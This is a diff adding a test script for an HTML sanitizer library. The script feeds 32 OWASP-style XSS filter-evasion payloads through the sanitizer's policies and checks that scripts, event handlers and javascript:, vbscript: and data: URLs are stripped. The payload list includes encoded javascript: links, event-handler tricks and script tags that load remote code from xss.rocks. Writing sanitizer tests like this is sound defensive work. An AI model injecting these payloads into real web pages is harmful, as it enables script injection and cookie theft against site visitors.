@@ -1,0 +1,159 @@
+# expect: basic <p>Hi <b>there</b> <a>x</a> <a href="https://ok.example/a?b=1&amp;c=2">y</a></p>
+# expect: text-only Hi there x y
+# expect: html-value <p>keep <em>me</em></p> | original kept: true
+# expect: attacks 32 safe 32
+# expect: idempotent 32
+# expect: rich <h2 class="t">Title</h2><img src="/a.png" alt="a"><table><tr><td colspan="2">c</td></tr></table>
+# expect: noopener <a href="https://x.example" target="_blank" rel="nofollow noopener noreferrer">x</a><a href="/y" target="_self">y</a>
+# expect: styles <div style="color: red; text-align: center">s</div><p>no</p>
+# expect: data-images <img src="data:image/png;base64,iVBORw0KGgo="><img><img>
+# expect: schemes <a href="tel:+390532">call</a><a>js</a><a>data</a>
+# expect: relative-off <a>rel</a><a href="https://abs.example/">abs</a>
+# expect: deny <p>link text</p>
+# expect: custom <section data-id="7" aria-label="x">s</section>
+# expect: unknown-unwrapped <p>a b c</p>
+# expect: entities <p>&lt;script&gt;alert(1)&lt;/script&gt; &amp; "q"</p>
+# expect: comment <p>ab</p>
+# expect: deep 300 levels -> 256 kept
+# expect: comments-feed 3 clean
+# Html.sanitize and HtmlPolicy: default (basic) and text-only policies, an
+# html value input left unchanged, 32 XSS payloads in the style of the
+# OWASP filter-evasion cheat sheet (each must come out without scripts,
+# event handlers, javascript:/vbscript:/data: URLs or dangerous elements,
+# and sanitizing again must not change it), the rich policy, noopener,
+# style filtering, data images, extra schemes, relative URLs off, denied
+# tags, custom attributes, unknown elements unwrapped, entities, comments,
+# deep nesting, and a comment feed rendered through a class.
+from lamhtml import Html, HtmlPolicy
+
+const Payloads: list[str] = [
+    "<script>alert('XSS')</script>",
+    "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
+    "<IMG SRC=\"javascript:alert('XSS');\">",
+    "<IMG SRC=javascript:alert('XSS')>",
+    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
+    "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
+    "<a onmouseover=\"alert(document.cookie)\">xxs link</a>",
+    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\\>",
+    "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">",
+    "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">x</a>",
+    "<a href=\"&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29\">x</a>",
+    "<a href=\"jav\tascript:alert('XSS');\">tab</a>",
+    "<a href=\"jav&#x09;ascript:alert('XSS');\">tab entity</a>",
+    "<a href=\"jav&#x0A;ascript:alert('XSS');\">newline</a>",
+    "<a href=\" &#14;  javascript:alert('XSS');\">leading</a>",
+    "<a href=\"javascript&colon;alert(1)\">colon entity</a>",
+    "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
+    "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
+    "<<SCRIPT>alert(\"XSS\");//\\<</SCRIPT>",
+    "<SCRIPT SRC=//xss.rocks/.j>",
+    "<iframe src=http://xss.rocks/scriptlet.html <",
+    "<svg/onload=alert('XSS')>",
+    "<svg><script>alert(1)</script></svg>",
+    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
+    "<a href=\"vbscript:msgbox('XSS')\">vb</a>",
+    "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">data</a>",
+    "<div style=\"background-image: url(javascript:alert('XSS'))\">bg</div>",
+    "<div style=\"width: expression(alert('XSS'));\">expr</div>",
+    "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
+    "<object type=\"text/x-scriptlet\" data=\"http://xss.rocks/scriptlet.html\"></object>",
+    "<form action=\"javascript:alert(1)\"><button formaction=\"javascript:alert(2)\">go</button></form>",
+    "<p title=\"</p><script>alert(1)</script>\">ok</p><!--<img src=x onerror=alert(1)>--><details open ontoggle=alert(1)>d</details>",
+]
+
+#- No live markup an attacker could use is left in ``clean`` (re-parsed). -#
+func safe(clean: html) -> bool {
+    text: str = str(clean).toLower()
+    for banned in ["<script", "<iframe", "<svg", "<math", "<style", "<object", "<meta", "<form", "<!--", "javascript:", "vbscript:", "data:text"] {
+        if text.contains(banned) {
+            return false
+        }
+    }
+    reparsed: html = Html.parse(str(clean))
+    for element in reparsed.select("*") {
+        for name, value in element.attrs() {
+            if name.toLower().startsWith("on") or name.toLower() == "style" {
+                return false
+            }
+            if name == "href" or name == "src" or name == "action" or name == "formaction" {
+                lower: str = value.toLower()
+                if not (lower.startsWith("https:") or lower.startsWith("http:") or lower.startsWith("mailto:") or lower.startsWith("/") or lower.startsWith("#") or not lower.contains(":")) {
+                    return false
+                }
+            }
+        }
+    }
+    return true
+}
+
+class Comment {
+    func init(self, author: str, body: str) {
+        self.author: str = author
+        self.body: str = body
+    }
+
+    func __html__(self) -> html {
+        return <><article><h3>${self.author}</h3>${Html.sanitize(self.body)}</article></>
+    }
+}
+
+func main() {
+    dirty: str = "<p onclick=alert(1)>Hi <b>there</b><script>alert(1)</script> <a href='javascript:alert(1)'>x</a> <a href=\"https://ok.example/a?b=1&c=2\" target=_blank>y</a></p>"
+    print(f"basic {Html.sanitize(dirty)}")
+    print(f"text-only {Html.sanitize(dirty, HtmlPolicy())}")
+    doc: html = <><p>keep <em>me</em><!-- c --></p></>
+    before: str = str(doc)
+    print(f"html-value {Html.sanitize(doc)} | original kept: {str(doc) == before}")
+
+    safeCount: int = 0
+    stable: int = 0
+    for payload in Payloads {
+        for policy in [HtmlPolicy.basic(), HtmlPolicy.rich()] {
+            clean: html = Html.sanitize(payload, policy)
+            again: html = Html.sanitize(str(clean), policy)
+            if policy.tags.length() > 30 {
+                if safe(clean) {
+                    safeCount += 1
+                }
+                if str(again) == str(clean) {
+                    stable += 1
+                }
+            } elif not safe(clean) {
+                print(f"unsafe basic output for {payload}: {clean}")
+            }
+        }
+    }
+    print(f"attacks {len(Payloads)} safe {safeCount}")
+    print(f"idempotent {stable}")
+
+    print(f"rich {Html.sanitize('<h2 class=t onclick=x>Title</h2><img src=/a.png alt=a onerror=x><table><tr><td colspan=2 style=x>c</td></tr></table>', HtmlPolicy.rich())}")
+    linkPolicy: HtmlPolicy = HtmlPolicy.rich()
+    print(f"noopener {Html.sanitize('<a href=https://x.example target=_blank rel=nofollow>x</a><a href=/y target=_self>y</a>', linkPolicy)}")
+    styled: HtmlPolicy = HtmlPolicy.rich().allowStyles(["color", "Text-Align"])
+    print(f"styles {Html.sanitize('<div style=\"color: red; background: url(x); TEXT-ALIGN:center; position: fixed; color: \\\\72 ed\">s</div><p style=\"position: fixed\">no</p>', styled)}")
+    images: HtmlPolicy = HtmlPolicy.rich().allowDataImages()
+    print(f"data-images {Html.sanitize('<img src=\"data:image/png;base64,iVBORw0KGgo=\"><img src=\"data:image/svg+xml;base64,PHN2Zz4=\"><img src=\"data:image/png;base64,<script>\">', images)}")
+    phones: HtmlPolicy = HtmlPolicy.basic().allowSchemes(["tel", "javascript", "data"])
+    print(f"schemes {Html.sanitize('<a href=\"tel:+390532\">call</a><a href=\"javascript:x\">js</a><a href=\"data:,x\">data</a>', phones)}")
+    absolute: HtmlPolicy = HtmlPolicy.basic().allowRelativeUrls(false)
+    print(f"relative-off {Html.sanitize('<a href=/x>rel</a><a href=https://abs.example/>abs</a>', absolute)}")
+    print(f"deny {Html.sanitize('<p><a href=/x>link</a> text</p>', HtmlPolicy.basic().denyTags(['A']))}")
+    custom: HtmlPolicy = HtmlPolicy().allowTags(["SECTION"]).allowAttributes("section", ["data-id", "aria-label", "bad name", "onclick"])
+    print(f"custom {Html.sanitize('<section data-id=7 aria-label=x onclick=y id=z>s</section>', custom)}")
+    print(f"unknown-unwrapped {Html.sanitize('<p><blink>a</blink> <custom-el x=1>b</custom-el> <font color=red>c</font></p>')}")
+    print(f"entities {Html.sanitize('<p>&lt;script&gt;alert(1)&lt;/script&gt; &amp; &quot;q&quot;</p>')}")
+    print(f"comment {Html.sanitize('<p>a<!-- hidden --><?php x ?>b</p><!DOCTYPE html>')}")
+
+    deep: str = ""
+    for _ in range(300) {
+        deep += "<b>"
+    }
+    nested: str = str(Html.sanitize(deep + "x"))
+    print(f"deep 300 levels -> {nested.count('<b>')} kept")
+
+    feed: list[Comment] = [Comment("ada", "<b>great</b> post"), Comment("<i>eve</i>", "<img src=x onerror=alert(1)>nice"), Comment("bob", "<a href=\"javascript:alert(1)\">link</a>")]
+    page: html = <><section>${[c for c in feed]}</section></>
+    rendered: str = str(page)
+    clean: bool = not rendered.contains("onerror") and not rendered.contains("javascript:") and rendered.contains("&lt;i&gt;eve&lt;/i&gt;")
+    print(f"comments-feed {len(page.select('article'))} {'clean' if clean else rendered}")
+}
